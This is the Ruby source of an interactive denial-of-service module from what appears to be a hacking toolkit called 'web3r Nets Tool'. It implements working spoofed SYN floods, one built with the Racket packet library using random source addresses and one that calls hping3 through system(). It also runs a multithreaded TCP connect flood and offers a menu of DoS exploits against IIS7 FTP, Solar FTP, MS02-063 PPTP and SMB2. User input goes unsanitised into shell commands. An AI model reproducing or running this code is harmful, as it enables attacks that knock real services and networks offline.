#!/usr/bin/env ruby

module Network_pb
class Net_dos_pb
def initialize()

require "socket"
require "timeout"
Dir.glob(File.join(File.dirname(__FILE__), '/Exp/*.rb')).each { |e| require e } # DoS Exploits
require File.dirname(__FILE__) + "/../../classes/racket/racket.rb"

exploit_options = { "host" => false, "port" => false, "defport" => false, "user" => false, "pass" => false }

puts ""
	puts "#{HC}#{FYEL}web3r#{FWHT} => #{FRED}Nets Tool"
	puts "#{FYEL}By: #{FRED}Alexcerus HR#{RS}"
	puts #{HC}"#{FYEL}You can use this tool as a way to Dossing with choices..!#{FWHT}"
#Some collections attacks and exploits added here :) to get more power just choose any one and take over ...
puts "#{HC}#{FWHT}\e[4mAvailable Attacks & Exploits Options: \e[24m#{RS} "
puts "#{FRED}#{HC}Available Attacks : #{HC}#{FWHT}"
puts "1.#{HC}#{FYEL}SYN SPF #{FWHT}     => #{FRED}Spoofed SYN Flood (fast mode)#{FWHT}"
puts "2.#{HC}#{FYEL}SYN SPF #{FWHT}     => #{FRED}Spoofed SYN Flood hping3 (random mode)#{FWHT}"
puts "3.#{HC}#{FYEL}TCP STR #{FWHT}     => #{FRED}Tcp flood3r (random mode)#{FWHT}"
puts "#{FRED}#{HC}Available Exploits : #{HC}#{FWHT}"
puts "4. #{HC}#{FYEL}httpr #{FWHT}      => #{FRED}Striker DoS#{FWHT}"
puts "5. #{HC}#{FYEL}httpo #{FWHT}      => #{FRED}Connect Routers DoS (Content-Type)#{FWHT}"
puts "6. #{HC}#{FYEL}ftp Win 7 #{FWHT}  => #{FRED}IIS7.7 HTPVC UNRAL DoS#{FWHT}"
puts "7. #{HC}#{FYEL}winftp #{FWHT}     => #{FRED}Solar FTP Server 2.1 DoS#{FWHT}"
puts "8. #{HC}#{FYEL}winpptp #{FWHT}    => #{FRED}MS02-063 PPTP Malformed Control Data Kernel DoS#{FWHT}"
puts "9. #{HC}#{FYEL}winsmb #{FWHT}     => #{FRED}Windows Vista/7 SMB2.0 Protocol Request DoS #{FWHT}"
puts ""
print "#{FRED}#{HC}nets3r >#{HC}#{FWHT}"
mode = gets_pb.chomp

if mode.to_i > 3

	modeint = mode.to_i
	if modeint == 4
		exploit_options = tcom_ssswitch_dos_load(exploit_options)
	elsif modeint == 5
		exploit_options = tcom_oconn_dos_load(exploit_options)
	elsif modeint == 6
		exploit_options = iis7ftp_dos_load(exploit_options)
	elsif modeint == 7
		exploit_options = solarftp_dos_load(exploit_options)
	elsif modeint == 8
		exploit_options = mspptp_dos_load(exploit_options)
	elsif modeint == 9
		exploit_options = smb_dos_load(exploit_options)
	else
		puts ""
		puts "There's only a few options dummy - You sir are a failure!"
		puts ""
	end

	if exploit_options["host"] != false
		puts ""
		puts " #{FRED}#{HC}( Insert host )"
		exploit_options["host"] = gets_pb.chomp
	end
	if exploit_options["defport"] != false
		puts ""
		puts " #{FRED}#{HC}Insert port (Default #{exploit_options['defport']})"
		e_port = gets_pb.chomp
		if e_port != ""
			exploit_options["defport"] = e_port.to_i
		end
	end
	if exploit_options["port"] != false
		puts ""
		puts " #{FRED}#{HC}( Insert port )"
		exploit_options["port"] = gets_pb.chomp.to_i
	end
	if exploit_options["user"] != false
		puts ""
		puts " Enter username here >"
		exploit_options["user"] = gets_pb.chomp
	end
	if exploit_options["pass"] != false
		puts ""
		puts " Enter password here"
		exploit_options["pass"] = gets_pb.chomp
	end

	puts ""

	if modeint == 4
		tcom_ssswitch_dos(exploit_options)
	elsif modeint == 5
		tcom_oconn_dos(exploit_options)
	elsif modeint == 6
		iis7ftp_dos(exploit_options)
	elsif modeint == 7
		solarftp_dos(exploit_options)
	elsif modeint == 8
		mspptp_dos(exploit_options)
	elsif modeint == 9
		smb_dos(exploit_options)
	end
else

	puts ""
	print "#{FRED}#{HC}Put host#{FWHT} : "
	ip = gets_pb.chomp
	puts ""
	print "#{FRED}#{HC}Enter port#{FWHT} : "
	port = gets_pb.chomp

	if mode == "1" || mode == "2"
		puts ""
		puts "#{FYEL}#{HC}You need Insert source address of the packets#{FWHT}...."
		source = gets_pb.chomp
		if source == ""
			randpackets = true
		else
			randpaquets = false
		end
	end

	puts ""
	spoofedsyn = 0
	if mode == "1"
		begin
			pack = Racket::Racket.new
			pack.l3 = Racket::L3::IPv4.new
			pack.l3.dst_ip = ip
			pack.l3.protocol = 6
			pack.l4 = Racket::L4::TCP.new
			pack.l4.src_port = rand(65535) + 1
			pack.l4.dst_port = port.to_i
			pack.l4.flag_syn = 1
			pack.l4.ack = 0
		rescue
			puts " #{FRED}#{HC}failed..... building packet."
			exit
		end
		if randpackets == true
			Thread.new do
				puts "#{HC}#{FRED}[#{FWHT}*#{FRED}]#{FWHT} Ok, Sending packet to #{FWHT}: #{FRED}#{ip} on port #{port}#{FWHT}"
				loop do
					sleep(1)
					STDOUT.flush
					print "\r    Number of Spoofed SYN sent -> #{spoofedsyn.to_s} (rand src) "
				end
			end
			begin
				loop do
					pack.l3.src_ip = "#{rand(255).to_s}.#{rand(255).to_s}.#{rand(255).to_s}.#{rand(255).to_s}"
					pack.l3.ttl = 128
					pack.l4.window = rand(4096) + 1
					pack.l4.src_port = rand(65535) + 1
					pack.l4.seq = 0
					pack.l4.fix!(pack.l3.src_ip, pack.l3.dst_ip, '')
					pack.sendpacket
					spoofedsyn += 1
				end
			rescue
				puts ""
				puts " Error sending packets. Root?"
				puts ""
				exit
			end
		else
			Thread.new do
				puts "#{HC}#{FRED}[#{FWHT}*#{FRED}]#{FWHT} Ok, Sending packet to #{FWHT}:#{FRED}#{ip}on port #{port}#{FWHT}"
				loop do
					sleep(1)
					STDOUT.flush
					print "\r#{HC}#{FRED}[#{FWHT}*#{FRED}]#{FWHT} Number of Spoofed SYN sent : #{FRED}#{spoofedsyn.to_s} (#{source}) "
				end
			end
			begin
				loop do
					pack.l3.src_ip = source
					pack.l3.ttl = 128
					pack.l4.window = rand(4096) + 1
					pack.l4.src_port = rand(65535) + 1
					pack.l4.seq = 0
					pack.l4.fix!(pack.l3.src_ip, pack.l3.dst_ip, '')
					pack.sendpacket
					spoofedsyn += 1
				end
			rescue
				puts ""
				puts "#{FYEL}#{HC}Error sending packets...."
				puts ""
				exit
			end
		end
	elsif mode == "2"
		if randpackets == true
			loop do
				source = "#{rand(256).to_s}.#{rand(256).to_s}.#{rand(256).to_s}.#{rand(256).to_s}"
				spoofedsyn += 100
				system("clear")
				puts ""
				puts "#{FRED}#{HC}Sending packets to :#{FWHT} #{ip} on port #{port}"
				puts "#{FRED}#{HC}Spoofed SYN sending :#{FWHT} #{spoofedsyn.to_s}"
				puts "source (#{source})"
				system("hping3 -q -c 100 -i u1000 -S -a #{source} -p #{port} #{ip}")
			end
		else
			loop do
				spoofedsyn += 500
				system("clear")
				puts ""
				puts "#{FRED}#{HC}Sending packets to :  #{ip} on port #{port}"
				puts "#{FRED}#{HC}Spoofed SYN sending : #{spoofedsyn.to_s}"
				puts "#{FWHT}######### Source (#{source})"
				system("hping3 -q -c 500 -i u1000 -S -a #{source} -p #{port} #{ip}")
			end
		end
	elsif mode == "3"
		$number = 0
		$bytes = 0
		$kbytes = 0

		def tcp_attack(ip, port)
			Thread.new do
				loop do
					begin
						# This number changes dramatically the power of the attack.
						Timeout::timeout(0.00001) do
							# Increases 2 because this code sends a SYN and then a RST (reset connection) packet,
							# this is caused by the Timeout.
							$number += 2
							# KBytes per second.
							# 74 bytes from the SYN and 54 from the RST.
							$bytes += 74 + 54
							$kbytes = $bytes/1024
							socket = TCPSocket.new(ip, port)
						end
					rescue Timeout::Error
					end
				end
			end
		end

		begin
			socket = TCPSocket.new(ip, port)
		rescue
		end

		if !socket
			puts "#{FYEL}#{HC}may be Closed port, or connection error..."
			puts ""
		else
			socket.close
			20.times do
				tcp_attack(ip, port)
			end
			puts "#{FRED}#{HC}Sending packets to :#{FWHT}  #{ip} on port #{port}"
			loop do
				STDOUT.flush
				print "\r#{HC}#{FRED}[#{FWHT}*#{FRED}]#{FWHT} sent : #{$number.to_s} - #{$kbytes.to_s} kB/s "
				$bytes = 0
				$kbytes = 0
				sleep(1)
			end
		end
	else
		puts "#{HC}#{FRED}Oops, Didn't quite understand that one#{FWHT}!#{FWHT}"
		puts "#{HC}#{FRED}Please Choose a Valid Option From Menu Below Next Time#{FWHT}........"
		puts ""
	end
end

end
end
end
#EOF